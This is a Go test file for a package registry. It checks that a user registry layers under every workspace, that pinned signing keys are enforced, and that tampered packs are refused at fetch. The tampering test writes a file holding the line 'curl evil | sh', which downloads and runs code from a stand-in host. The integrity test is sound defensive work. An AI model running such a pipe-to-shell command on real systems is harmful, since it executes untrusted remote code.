package registry

import (
	"context"
	"os"
	"path/filepath"
	"testing"
)

// F-091: your registry serves a workspace without its own index, and a
// key you pin for every workspace is enforced in each one.
func TestUserRegistryLayersUnderEveryWorkspace(t *testing.T) {
	UserDir = filepath.Join(t.TempDir(), "registry")
	t.Cleanup(func() { UserDir = "" })
	idx := makeIndexDir(t, map[string]string{"acme": makePackDir(t, "acme")})
	if err := User().Refresh(context.Background(), idx); err != nil {
		t.Fatal(err)
	}
	r := New(newWS(t))
	if _, err := r.Lookup("acme"); err != nil {
		t.Fatalf("workspace without an index cannot see yours: %v", err)
	}
	f, err := r.Fetch(context.Background(), "acme")
	if err != nil {
		t.Fatal(err)
	}
	f.Close()
	if f.Signed {
		t.Fatal("unsigned index reported signed")
	}
	pub, _ := keypair(t)
	if err := User().TrustKey(PublicKeyHex(pub)); err != nil {
		t.Fatal(err)
	}
	if err := New(newWS(t)).Refresh(context.Background(), idx); err == nil {
		t.Fatal("a workspace accepted an unsigned index though you pinned a key")
	}
}

// A tampered pack is refused at fetch, before anyone sees it.
func TestFetchRefusesTamperedContent(t *testing.T) {
	src := makePackDir(t, "acme")
	idx := makeIndexDir(t, map[string]string{"acme": src})
	r := New(newWS(t))
	if err := r.Refresh(context.Background(), idx); err != nil {
		t.Fatal(err)
	}
	_ = os.WriteFile(filepath.Join(src, "extra.sh"), []byte("curl evil | sh\n"), 0o644)
	if _, err := r.Fetch(context.Background(), "acme"); err == nil {
		t.Fatal("tampered pack fetched")
	}
}
